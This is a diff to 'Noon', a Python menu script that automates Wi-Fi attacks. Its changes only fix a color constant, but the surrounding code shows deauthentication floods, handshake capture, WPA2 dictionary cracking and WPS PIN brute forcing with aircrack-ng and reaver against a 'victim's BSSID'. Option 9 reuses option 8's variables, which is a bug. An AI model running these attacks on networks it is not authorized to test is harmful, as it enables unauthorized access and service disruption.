@@ -119,72 +119,72 @@ while ask == 'True':
     
     time.sleep(2)
 
-    main = input (f"{bcolors.BOLD} [*] Please choose an option: {bcolors.END}")
+    main = input (f"{bcolors.BOLD} [*] Please choose an option: {bcolors.ENDC}")
     if main == '1':
             print(f"{bcolors.OKGREEN} [*] Checking active interfaces... {bcolors.ENDC} ")
             time.sleep(2)
             subprocess.call(["iw", "dev"])
     elif main == '2':
-            intf1 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf1 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(2)
             print(f"{bcolors.OKGREEN} [*] Enabling monitor mode... {bcolors.ENDC}")
             subprocess.call(["sudo", "airmon-ng" , "check" , "kill"])
             subprocess.call(["sudo", "airmon-ng" , "start" , intf1])
             subprocess.call(["sudo", "ip" , "link" , "set" , intf1 , "up"])       
     elif main == '3':
-            intf2 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf2 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(2)
             print(f"{bcolors.OKGREEN} [*] Starting Wash Scan... {bcolors.ENDC}")
             time.sleep(1)
             subprocess.call(["sudo", "wash" , "-i" , intf2])    
     elif main == '4':
-            intf3 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf3 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(1)
             print(f"{bcolors.OKGREEN} [*] Starting Access Point Scan... {bcolors.ENDC}")
             time.sleep(1)
             subprocess.call(["sudo", "airodump-ng" , "-i" , intf3])    
     elif main == '5':
-            intf4 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf4 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(1)
-            ch1 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
+            ch1 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.ENDC}")
             time.sleep(1)
-            bssid1 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
+            bssid1 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.ENDC}")
             time.sleep(1)
-            svp1 = input(f"{bcolors.BOLD} [*] Please set the location to save the capture. [ex./usr/bin/...]: {bcolors.END}")
+            svp1 = input(f"{bcolors.BOLD} [*] Please set the location to save the capture. [ex./usr/bin/...]: {bcolors.ENDC}")
             time.sleep(1)
             subprocess.call(["sudo", "airodump-ng" , "-c" , ch1 , "--bssid" , bssid1 , "-w" , svp1 , intf4]) 
     elif main == '6':
-            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(1)
-            np1 = input(f"{bcolors.BOLD} [*] Please set the number of packets to send. [0 for Packet Spam.]: {bcolors.END}")
+            np1 = input(f"{bcolors.BOLD} [*] Please set the number of packets to send. [0 for Packet Spam.]: {bcolors.ENDC}")
             time.sleep(1)
-            bssid2 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
+            bssid2 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.ENDC}")
             time.sleep(1)
             subprocess.call(["sudo", "aireplay-ng" , "-0" , np1 , "-a" , bssid2 , intf5])
     elif main == '7':
-            bssid3 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}")
+            bssid3 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.ENDC}")
             time.sleep(1)
-            hssvp2 = input(f"{bcolors.BOLD} [*] Please enter the [.cap] file's location. [ex./usr/bin/...]: {bcolors.END}")
+            hssvp2 = input(f"{bcolors.BOLD} [*] Please enter the [.cap] file's location. [ex./usr/bin/...]: {bcolors.ENDC}")
             time.sleep(1)
-            dic1 = input(f"{bcolors.BOLD} [*] Please enter the dictionary file's location. [ex./usr/bin/...]: {bcolors.END}")
+            dic1 = input(f"{bcolors.BOLD} [*] Please enter the dictionary file's location. [ex./usr/bin/...]: {bcolors.ENDC}")
             time.sleep(1)
             subprocess.call(["sudo", "aircrack-ng" , "-a2" , "-b" , bssid3 , "-w" , dic1 , hssvp2])
     elif main == '8':
-            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf5 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(1)
-            ch2 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
+            ch2 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.ENDC}")
             time.sleep(1)
-            bssid4 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}") 
+            bssid4 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.ENDC}") 
             time.sleep(1)
             subprocess.call(["sudo", "reaver" , "-i" , intf5 , "-b" , bssid4 , "-c" , ch2 , "-vvv" , "-K" , "1" , "-f"]) 
     elif main == '9':
-            intf6 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.END}")
+            intf6 = input(f"{bcolors.BOLD} [*] Please set the interface to use: {bcolors.ENDC}")
             time.sleep(1)
-            ch3 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.END}")
+            ch3 = input(f"{bcolors.BOLD} [*] Please set the channel to use: {bcolors.ENDC}")
             time.sleep(1)
-            bssid5 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.END}") 
+            bssid5 = input(f"{bcolors.BOLD} [*] Please set the victim's BSSID: {bcolors.ENDC}") 
             time.sleep(1)
-            pin1 = input(f"{bcolors.BOLD} [*] Please set the victim's WPS Pin: {bcolors.END}") 
+            pin1 = input(f"{bcolors.BOLD} [*] Please set the victim's WPS Pin: {bcolors.ENDC}") 
             time.sleep(1)
             subprocess.call(["sudo", "reaver" , "-i" , intf5 , "-b" , bssid4 , "-c" , ch2 , "-p" , pin1]) 
     elif main == help1:
@@ -193,7 +193,7 @@ while ask == 'True':
     [#] Noon is a Multi-Use Wireless Auditor, 
         meant to automate Wireless attacks and
         increase efficiency while hacking.      
-    [#] Noon - Version 0.1 - by cristi092. {bcolors.END}
+    [#] Noon - Version 0.1 - by cristi092. {bcolors.ENDC}
     
                     """)
     elif main == help2:
@@ -202,7 +202,7 @@ while ask == 'True':
     [#] Noon is a Multi-Use Wireless Auditor, 
         meant to automate Wireless attacks and
         increase efficiency while hacking.      
-    [#] Noon - Version 0.1 - by cristi092. {bcolors.END}
+    [#] Noon - Version 0.1 - by cristi092. {bcolors.ENDC}
     
                     """)
     elif main == '0':
